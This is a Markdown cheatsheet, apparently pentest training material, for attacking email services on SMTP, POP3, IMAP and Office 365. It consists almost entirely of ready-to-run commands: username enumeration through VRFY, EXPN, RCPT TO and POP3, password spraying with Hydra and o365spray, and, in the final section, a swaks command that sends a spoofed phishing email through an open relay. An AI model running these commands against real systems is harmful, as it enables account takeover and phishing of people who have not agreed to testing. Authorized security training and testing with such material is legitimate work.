# Email Services Enumeration Cheatsheet

Enumerating email services (SMTP, POP3, IMAP4) on ports 25, 110, 143, 465, 587, 993, 995.

## 1. Enumerate MX Records (host)
Identify mail servers for a domain using MX DNS records.
```bash
host -t MX target.com
```
- `-t MX`: Queries MX records.
- Example output: `target.com mail is handled by 10 mail1.target.com`.

## 2. Enumerate MX Records (dig)
Query MX records for a domain.
```bash
dig mx target.com | grep "MX" | grep -v ";"
```
- Filters MX records from dig output.
- Example output: `target.com. 300 IN MX 10 mail1.target.com.`

## 3. Enumerate A Records (host)
Resolve mail server hostname to IP address.
```bash
host -t A mail1.target.com
```
- `-t A`: Queries A records.
- Example output: `mail1.target.com has address 10.129.14.128`.

## 4. Scan Email Ports (nmap)
Scan common email service ports for version and service details.
```bash
sudo nmap -Pn -sV -sC -p25,110,143,465,587,993,995 target.com
```
- `-Pn`: Skips host discovery.
- `-sV`: Detects service versions.
- `-sC`: Runs default scripts.
- `-p`: Targets ports 25 (SMTP), 110 (POP3), 143 (IMAP4), 465 (SMTP encrypted), 587 (SMTP STARTTLS), 993 (IMAP4 encrypted), 995 (POP3 encrypted).

## 5. Enumerate Users with VRFY (telnet)
Check for valid usernames using SMTP VRFY command.
```bash
telnet target.com 25
VRFY username
```
- Connect to SMTP server (port 25).
- `VRFY username`: Checks if username exists (e.g., `252 2.0.0 username` for valid, `550 5.1.1` for invalid).

## 6. Enumerate Users with EXPN (telnet)
List users in a distribution list using SMTP EXPN command.
```bash
telnet target.com 25
EXPN groupname
```
- Connect to SMTP server (port 25).
- `EXPN groupname`: Lists users in group (e.g., `250 2.0.0 user@target.com`).

## 7. Enumerate Users with RCPT TO (telnet)
Verify usernames using SMTP RCPT TO command.
```bash
telnet target.com 25
MAIL FROM:test@domain.com
RCPT TO:username
```
- `MAIL FROM`: Sets sender email.
- `RCPT TO`: Checks recipient (e.g., `250 2.1.5` for valid, `550 5.1.1` for invalid).

## 8. Enumerate Users with POP3 (telnet)
Check for valid usernames using POP3 USER command.
```bash
telnet target.com 110
USER username
```
- Connect to POP3 server (port 110).
- `USER username`: Returns `+OK` for valid users, `-ERR` for invalid.

## 9. Automate User Enumeration (smtp-user-enum)
Enumerate usernames via SMTP with a user list.
```bash
smtp-user-enum -M RCPT -U userlist.txt -D target.com -t target_ip
```
- `-M RCPT`: Uses RCPT TO method (VRFY or EXPN also supported).
- `-U userlist.txt`: File with usernames.
- `-D target.com`: Domain for email addresses.
- `-t target_ip`: Target IP address.

## 10. Validate Office 365 Domain (o365spray)
Check if a domain uses Office 365.
```bash
python3 o365spray.py --validate --domain target.com
```
- `--validate`: Checks for Office 365 usage.
- `--domain`: Target domain.

## 11. Enumerate Office 365 Users (o365spray)
Enumerate valid usernames for Office 365.
```bash
python3 o365spray.py --enum -U users.txt --domain target.com
```
- `--enum`: Enables user enumeration.
- `-U users.txt`: File with usernames.
- `--domain`: Target domain.

## 12. Password Spray with Hydra (POP3)
Perform password spraying against POP3 service.
```bash
hydra -L users.txt -p 'password' -f target.com pop3
```
- `-L users.txt`: File with usernames.
- `-p 'password'`: Password to test.
- `-f`: Stops on first valid credential.
- `pop3`: Targets POP3 protocol (port 110).

## 13. Password Spray Office 365 (o365spray)
Password spray against Office 365 users.
```bash
python3 o365spray.py --spray -U usersfound.txt -p 'password' --count 1 --lockout 1 --domain target.com
```
- `--spray`: Enables password spraying.
- `-U usersfound.txt`: File with usernames.
- `-p 'password'`: Password to test.
- `--count 1`: Number of passwords per spray.
- `--lockout 1`: Lockout wait time (minutes).
- `--domain`: Target domain.

## 14. Check for Open Relay (nmap)
Identify if SMTP server allows open relay.
```bash
nmap -p25 -Pn --script smtp-open-relay target.com
```
- `-p25`: Targets SMTP port.
- `-Pn`: Skips host discovery.
- `--script smtp-open-relay`: Tests for open relay.

## 15. Send Phishing Email via Open Relay (swaks)
Send email through an open relay SMTP server.
```bash
swaks --from sender@target.com --to recipient@target.com --header 'Subject: Notification' --body 'Click here: http://phishinglink.com' --server target.com
```
- `--from`: Spoofed sender email.
- `--to`: Recipient email.
- `--header`: Email subject.
- `--body`: Email content.
- `--server`: Target SMTP server.